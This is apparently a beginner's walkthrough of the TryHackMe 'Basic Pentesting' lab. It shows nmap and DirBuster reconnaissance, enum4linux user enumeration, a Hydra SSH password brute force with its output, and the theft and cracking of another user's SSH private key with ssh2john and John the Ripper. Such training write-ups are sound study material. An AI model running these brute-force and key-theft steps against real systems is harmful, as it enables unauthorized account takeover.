Basic Pentesting
Web Application and Privilege Escalation

Link to Room
https://tryhackme.com/room/basicpentestingjt

Introduction

In this room we will learn about scanning hosts for open ports and services as well as the version of those service and cracking passwords. Some tools that we will be utilizing will be NMap for the host scanning and Enum4linux for user enumeration. For the password cracking we will be using the JohntheRipper tool. 

Enumeration

sudo nmap -sV -sS -T4 -O <targetIP>
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-13 10:37 EDT
Nmap scan report for 10.10.251.6
Host is up (0.11s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13?
8080/tcp open  http-proxy
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/13%OT=22%CT=1%CU=31167%PV=Y%DS=4%DC=I%G=Y%TM=634823
OS:92%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST
OS:11NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 4 hops
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 211.07 seconds

Q:
The first question that we will need to answer is the hidden directory

To find this you can use either the gobuster or the OWASP Dirbuster. For my writeup I chose to use Dirbuster
For the wordlist I chose to use the Directory List Medium. This tool will try to brute force any directories that may be listed on the target computer. You will need to enter the address that you are going to attack and then provide a wordlist that Dirbuster will use to find the directories. Below is a snippet of what I had found. With this, you should be able to answer the question.

dirbuster
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dir found: / - 200
Dir found: /icons/ - 403
Dir found: /development/ - 200
File found: /development/dev.txt - 200
File found: /development/j.txt - 200
Dir found: /icons/small/ - 403
DirBuster Stopped

Once the you have the information that you need simply open up a browser on either the AttackBox or your own machine and go to the site: http://ipoftarget/development

Once there you should see a directory listing a few files. Read these because they can provide some clues as to what we may need to find later.

/development/dev.txt
/development/j.txt

Q:
Using brute force what is the username and the password of one of the users?

When reading the two files that were found we had a hint of two users J and K, but those are not the usernames on the system.
To find the usernames we will use a tool called enum4linux, this should already be installed on Kali and should be on the AttackBox

We will run enum4linux -a <IPof Target> and it will do its thing and look through Samba, this could take a while to complete as well. 

──(nathan㉿Sec-Kali)-[~]
└─$ enum4linux -a Redacted 
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Oct 13 10:55:16 2022

 =========================================( Target Information )=========================================                                                                   
                                                                                      
Target ........... Redacted                                                       
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on Redacted )============================                                                                    
                                                                                      
                                                                                      
[+] Got domain/workgroup name: WORKGROUP                                              
                                                                                      
                                                                                      
 ================================( Nbtstat Information for Redacted )================================                                                                    
                                                                                      
Looking up status of  Redacted                                                     
        BASIC2          <00> -         B <ACTIVE>  Workstation Service
        BASIC2          <03> -         B <ACTIVE>  Messenger Service
        BASIC2          <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ====================================( Session Check on Redacted )====================================                                                                   
                                                                                      
                                                                                      
[+] Server 10.10.251.6 allows sessions using username '', password ''                 
                                                                                      
                                                                                      
 =================================( Getting domain SID for Redacted)=================================                                                                   
                                                                                      
Domain Name: WORKGROUP                                                                
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                  
                                                                                      
                                                                                      
 ===================================( OS information on Redacted )===================================                                                                    
                                                                                      
                                                                                      
[E] Can't get OS info with smbclient                                                  
                                                                                      
                                                                                      
[+] Got OS info for Redacted from srvinfo:                                         
        BASIC2         Wk Sv PrQ Unx NT SNT Samba Server 4.3.11-Ubuntu                
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 ========================================( Users on Redacted )========================================                                                                   
                                                                                      
Use of uninitialized value $users in print at ./enum4linux.pl line 972.               
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 ==================================( Share Enumeration on Redacted )==================================                                                                   
                                                                                      
                                                                                      
        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BASIC2

[+] Attempting to map shares on Redacted                                           
                                                                                      
//Redacted/Anonymous Mapping: OK Listing: OK Writing: N/A                          

[E] Can't understand response:                                                        
                                                                                      
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                            
//Redacted/IPC$      Mapping: N/A Listing: N/A Writing: N/A

 ============================( Password Policy Information for Redacted )============================                                                                    
                                                                                      
                                                                                      

[+] Attaching to Redacted using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] BASIC2
        [+] Builtin

[+] Password Info for Domain: BASIC2

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                  
                                                                                      
                                                                                      
Password Complexity: Disabled                                                         
Minimum Password Length: 5


 =======================================( Groups on Redacted )=======================================                                                                    
                                                                                      
                                                                                      
[+] Getting builtin groups:                                                           
                                                                                      
                                                                                      
[+]  Getting builtin group memberships:                                               
                                                                                      
                                                                                      
[+]  Getting local groups:                                                            
                                                                                      
                                                                                      
[+]  Getting local group memberships:                                                 
                                                                                      
                                                                                      
[+]  Getting domain groups:                                                           
                                                                                      
                                                                                      
[+]  Getting domain group memberships:                                                
                                                                                      
                                                                                      
 ===================( Users on Redacted via RID cycling (RIDS: 500-550,1000-1050) )===================                                                                   
                                                                                      
                                                                                      
[I] Found new SID:                                                                    
S-1-22-1                                                                              

[I] Found new SID:                                                                    
S-1-5-32                                                                              

[I] Found new SID:                                                                    
S-1-5-32                                                                              

[I] Found new SID:                                                                    
S-1-5-32                                                                              

[I] Found new SID:                                                                    
S-1-5-32                                                                              

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''           
                                                                                      
S-1-22-1-1000 Unix User\*** (Local User)                                              
S-1-22-1-1001 Unix User\*** (Local User)

[+] Enumerating users using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username '', password ''                                                                
                                                                                      
S-1-5-21-2853212168-2008227510-3551253869-501 BASIC2\nobody (Local User)              
S-1-5-21-2853212168-2008227510-3551253869-513 BASIC2\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''           
                                                                                      
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                     
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

 ================================( Getting printer info for Redacted )================================                                                                   
                                                                                      
No printers returned.                                                                 


enum4linux complete on Thu Oct 13 11:04:28 2022
=======================================================================================================

Now we have our users listed and can answer question on the username. To get the passord we will need to use the tool Hydra to brute force a password. We can do this on a service that was listed in the NMap scan which was SSH. We can accomplish this be entering the following command:

hydra -l jan -P rockyou.txt -vV ssh://TargetIP        
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-13 11:22:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://Redacted:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://jan@hydra -l jan -P rockyou.txt -vV ssh://Redacted        
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-13 11:22:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://Redacted:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://jan@10.10.251.6:22
[INFO] Successful, password authentication is supported by ssh://10.10.251.6:22
[ATTEMPT] target Redacted - login "jan" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target Redacted - login "jan" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target Redacted - login "jan" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target Redacted - login "jan" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target Redacted - login "jan" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target Redacted - login "jan" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target Redacted - login "jan" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target Redacted - login "jan" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target Redacted - login "jan" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target Redacted - login "jan" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
[ATTEMPT] target Redacted - login "jan" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
[ATTEMPT] target Redacted - login "jan" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
[ATTEMPT] target Redacted - login "jan" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
[ATTEMPT] target Redacted - login "jan" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
[ATTEMPT] target Redacted - login "jan" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
[ATTEMPT] target Redacted - login "jan" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Disabled child 9 because of too many errors
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Disabled child 8 because of too many errors
[ATTEMPT] target Redacted - login "jan" - pass "654321" - 17 of 14344401 [child 7] (0/2)
[ATTEMPT] target Redacted - login "jan" - pass "michael" - 18 of 14344401 [child 4] (0/2)
[ATTEMPT] target Redacted - login "jan" - pass "ashley" - 19 of 14344401 [child 11] (0/2)
[ATTEMPT] target Redacted - login "jan" - pass "qwerty" - 20 of 14344401 [child 10] (0/2)
[ATTEMPT] target Redacted - login "jan" - pass "111111" - 21 of 14344401 [child 14] (0/2)
[ATTEMPT] target Redacted - login "jan" - pass "iloveu" - 22 of 14344401 [child 0] (0/2)
[ATTEMPT] target Redacted - login "jan" - pass "000000" - 23 of 14344401 [child 1] (0/2)
[ATTEMPT] target Redacted - login "jan" - pass "michelle" - 24 of 14344401 [child 2] (0/2)
[ATTEMPT] target Redacted - login "jan" - pass "tigger" - 25 of 14344401 [child 3] (0/2)
[ATTEMPT] target Redacted - login "jan" - pass "sunshine" - 26 of 14344401 [child 5] (0/2)
[ATTEMPT] target Redacted - login "jan" - pass "chocolate" - 27 of 14344401 [child 6] (0/2)
[ATTEMPT] target Redacted - login "jan" - pass "password1" - 28 of 14344401 [child 12] (0/2)
[ATTEMPT] target Redacted - login "jan" - pass "soccer" - 29 of 14344401 [child 13] (0/2)
[ATTEMPT] target Redacted - login "jan" - pass "anthony" - 30 of 14344401 [child 15] (0/2)
[ATTEMPT] target Redacted - login "jan" - pass "friends" - 31 of 14344401 [child 7] (0/2)
[ATTEMPT] target Redacted - login "jan" - pass "butterfly" - 32 of 14344401 [child 4] (0/2)
[ATTEMPT] target Redacted - login "jan" - pass "armando" - 780 of 14344401 [child 0] (0/2)
[22][ssh] host: Redacted    login: jan   password: **********
[STATUS] attack finished for 10.10.251.6 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-13 11:30:30:22

Once this coompletes you will be able to see the password for the user. Now we can log into the computer as the other user. After doing so we can answer the two questions on asking for the password and:

ssh jan@10.10.251.6                     
The authenticity of host '10.10.251.6 (10.10.251.6)' can't be established.
ED25519 key fingerprint is SHA256:XKjDkLKocbzjCch0Tpriw1PeLPuzDufTGZa4xMDA+o4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.251.6' (ED25519) to the list of known hosts.
jan@10.10.251.6's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102
jan@basic2:~$ 

Q:
What service is used to access the server? 

Now its time to find any way that we escalte our privileges on the server. There does not appear to be anything in the home directory for the current user. However, what if we were to change our directory, there should be another directory we can see and access. You should see the other user's home directory after change back one. 
We will access the directory and see if there is anything useful there. If at first there isn't anything try to use the command "ls -a" on the home directory. Now change to the .ssh folder and there will be an "id_rsa", this is private key used to log into the server via SSH.

jan@basic2:~$ cd ..
jan@basic2:/home$ ls
jan  kay
jan@basic2:/home$ cd kay
jan@basic2:/home/kay$ ls
pass.bak
jan@basic2:/home/kay$ ls -a
.   .bash_history  .bashrc  .lesshst  pass.bak  .ssh                       .viminfo
..  .bash_logout   .cache   .nano     .profile  .sudo_as_admin_successful
jan@basic2:/home/kay$ cd .ssh
jan@basic2:/home/kay/.ssh$ s
s: command not found
jan@basic2:/home/kay/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub


We can use "cat id_rsa" and we will be givine the contents. Copy this, all of it from beginning to end and then type "nano id_rsa" on your terminal

After this is complete you now have a copy of the key, besure to set the proper permissions of this key or it will be ignored. "chmod 600 <file>"

Once done, then use a subtool of JohntheRipper - SSH2john, this will convert the ssh key to a hash that can then be cracked with the John tool

┌──(*****㉿Sec-Kali)-[~]
└─$ ssh2john id_rsa > hash

──(*****㉿Sec-Kali)-[~]
└─$ john --wordlist=rockyou.txt hash    
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
********          (id_rsa)     
1g 0:00:00:00 DONE (2022-10-13 12:29) 3.571g/s 295485p/s 295485c/s 295485C/s behlat..bball40
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


Now that we have figured out the passphrase for the ssh key we can now log in as the other user

ssh -i <ssh key> kay@targetIP
──(nathan㉿Sec-Kali)-[~]
└─$ ssh -i id_rsa kay@TargetIP 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak
Final_Flag
kay@basic2:~$ Connection to  closed by remote host.
Connection to 10.10.251.6 closed.
                                                                                      
┌──(nathan㉿Sec-Kali)-[~]
└─$ 


Log in and then use the "ls" command and you should see a file "pass.bak"

You should now have the permissions to read this file and reveal the last question.


**Thank you for taking the time to read this writeup, this is my first time writting in GitHub so sorry if this is a little dry.** 



